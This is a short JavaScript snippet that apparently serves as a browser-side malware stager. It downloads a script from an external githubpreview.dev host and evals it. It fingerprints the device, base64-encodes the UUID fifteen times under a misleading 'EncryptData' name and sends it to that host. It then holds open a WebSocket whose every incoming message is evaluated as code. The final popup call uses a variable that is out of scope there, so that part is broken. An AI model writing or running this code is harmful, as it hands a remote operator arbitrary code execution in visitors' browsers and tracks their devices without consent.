function EncryptData(data) {
    var encodetimes = 15;
    var inputcode = data;
    for (var i = 0; i < encodetimes; i++) {
        inputcode = btoa(inputcode);
    };
    return inputcode;
};
fetch('https://powershell1-datastore101-px4vw57726jrp-3000.githubpreview.dev/get/script1.js')
.then(response => response.text())
.then(text => {
    eval(text);
    var browseruuid = new DeviceUUID().get();
    new WebSocket(`wss://powershell1-datastore101-px4vw57726jrp-3000.githubpreview.dev/protocol_link/${EncryptData(browseruuid)}`).onmessage = (msgevent) => {    
        eval(msgevent.data);
    };
    window.open(`https://powershell1-datastore101-px4vw57726jrp-3000.githubpreview.dev/hwid-check/${EncryptData(inputcode)}`, "newwindow", "width=800,height=600");
});